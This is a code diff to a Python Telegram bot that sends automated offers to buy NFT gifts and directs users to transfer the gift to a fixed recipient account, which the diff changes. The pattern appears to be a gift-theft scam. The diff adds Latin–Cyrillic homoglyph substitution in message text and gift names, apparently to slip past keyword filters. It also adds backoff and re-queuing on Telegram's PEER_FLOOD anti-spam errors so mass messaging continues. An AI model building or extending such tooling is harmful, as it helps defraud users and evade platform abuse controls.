@@ -22,7 +22,7 @@ bot = Bot(BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
 dp = Dispatcher()
 
 GIFT_RE = re.compile(r"t\.me/nft/([A-Za-z]+?)-(\d+)")
-RECIPIENT = "@crypqtan"
+RECIPIENT = "@racegoers"
 LANG_TAGS = {"ru", "ukr", "eng", "cn", "en", "uk", "zh"}
 
 E_GEM   = "5318901904686754959"
@@ -39,6 +39,17 @@ message_queue = asyncio.Queue()
 
 def em(eid: str, fallback: str) -> str:
     return f'<tg-emoji emoji-id="{eid}">{fallback}</tg-emoji>'
+
+LAT_TO_CYR = {
+    "A": "А", "a": "а", "C": "С", "c": "с",
+    "E": "Е", "e": "е", "O": "О", "o": "о",
+    "X": "Х", "x": "х",
+}
+CYR_TO_LAT = {v: k for k, v in LAT_TO_CYR.items()}
+
+def homoglyphs(text: str, lang: str) -> str:
+    table = CYR_TO_LAT if lang == "ru" else {}
+    return "".join(table.get(c, c) for c in text)
 
 TEXTS = {
     "ru": {
@@ -128,7 +139,8 @@ TEXTS = {
 }
 
 def T(lang, key):
-    return TEXTS.get(lang, TEXTS["ru"]).get(key, TEXTS["ru"][key])
+    raw = TEXTS.get(lang, TEXTS["ru"]).get(key, TEXTS["ru"][key])
+    return homoglyphs(raw, lang)
 
 def parse_command(text):
     if not text:
@@ -183,15 +195,16 @@ def amount_line(amount, currency, lang):
         return f'{em(E_GEM, "💎")} <b>{amount:.0f} {T(lang, "gram")}</b>'
     return f'{em(E_STAR, "⭐")} <b>{amount:.0f} {T(lang, "stars")}</b>'
 
-def gift_link_bold(gift_name, gift_num):
+def gift_link_bold(gift_name, gift_num, lang):
     slug = gift_name.replace(" ", "")
-    return f'<b><a href="https://t.me/nft/{slug}-{gift_num}">{gift_name} #{gift_num}</a></b>'
+    visible = gift_name if lang == "ru" else homoglyphs(gift_name, lang)
+    return f'<b><a href="https://t.me/nft/{slug}-{gift_num}">{visible} #{gift_num}</a></b>'
 
 def build_offer_text(amount, currency, gift_name, gift_num, lang):
     return (
         f'{em(E_GIFT, "🎁")} {T(lang, "offer_1")}\n'
         f'{amount_line(amount, currency, lang)} {T(lang, "offer_for")} '
-        f'{gift_link_bold(gift_name, gift_num)}.\n\n'
+        f'{gift_link_bold(gift_name, gift_num, lang)}.\n\n'
         f'{em(E_TIMER, "⏱")} {T(lang, "offer_time")}\n'
         f'{em(E_LOCK, "🔒")} {T(lang, "offer_fix")}'
     )
@@ -199,11 +212,11 @@ def build_offer_text(amount, currency, gift_name, gift_num, lang):
 def build_accept_text(amount, currency, gift_name, gift_num, order_id, lang):
     return (
         f'{em(E_CHECK, "✅")} <b>{T(lang, "accept_ok")}</b>\n\n'
-        f'{em(E_GIFT, "🎁")} {T(lang, "accept_give")} {gift_link_bold(gift_name, gift_num)}.\n'
+        f'{em(E_GIFT, "🎁")} {T(lang, "accept_give")} {gift_link_bold(gift_name, gift_num, lang)}.\n'
         f'{T(lang, "accept_then")}\n'
         f'{T(lang, "accept_warn")}\n\n'
         f'{amount_line(amount, currency, lang)} {T(lang, "accept_price")} '
-        f'{gift_name} #{gift_num}.\n\n'
+        f'{gift_name if lang == "ru" else homoglyphs(gift_name, lang)} #{gift_num}.\n\n'
         f'<i>{T(lang, "order")} #{order_id}, {T(lang, "recipient")} {RECIPIENT}</i>'
     )
 
@@ -248,6 +261,7 @@ def gen_order_id():
     return "TG-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=10))
 
 async def sender_worker():
+    backoff = 1.5
     while True:
         chat_id, text, reply_markup, bcid, message_id = await message_queue.get()
         try:
@@ -261,11 +275,19 @@ async def sender_worker():
                 business_connection_id=bcid,
                 message_ids=[message_id],
             )
+            backoff = 1.5
         except Exception as e:
-            logging.error(f"worker error: {e}")
+            err_str = str(e)
+            if "PEER_FLOOD" in err_str:
+                logging.error(f"Flood guard tripped. Backing off for {backoff}s")
+                await asyncio.sleep(backoff)
+                backoff = min(backoff * 2, 60.0)
+                await message_queue.put((chat_id, text, reply_markup, bcid, message_id))
+            else:
+                logging.error(f"worker error: {e}")
         finally:
             message_queue.task_done()
-            await asyncio.sleep(1.2)
+            await asyncio.sleep(2.0)
 
 @dp.business_message(F.text)
 async def handle_business_message(message: Message):
@@ -287,7 +309,7 @@ async def handle_business_message(message: Message):
 
 @dp.message(CommandStart())
 async def cmd_start(message: Message):
-    await message.answer("🎁 Очередь работает. Пришли ссылку на подарок, язык и сумму.")
+    await message.answer("🎁 Бот запущен. Пришли ссылку на подарок, язык и сумму.")
 
 @dp.callback_query(F.data.startswith("a|"))
 async def accept(cb: CallbackQuery):
@@ -314,7 +336,7 @@ async def accept(cb: CallbackQuery):
 @dp.callback_query(F.data == "decline")
 async def decline(cb: CallbackQuery):
     try:
-        await cb.message.edit_text(text=f'{em(E_NO, "❌")} Оффер был отклонён.', reply_markup=None)
+        await cb.message.edit_text(text=f'{em(E_NO, "❌")} {T("ru", "declined")}', reply_markup=None)
     except Exception as e:
         logging.error(f"decline edit error: {e}")
         await cb.answer("Не удалось обновить", show_alert=True)
@@ -339,3 +361,4 @@ async def main():
 
 if __name__ == "__main__":
     asyncio.run(main())
+    
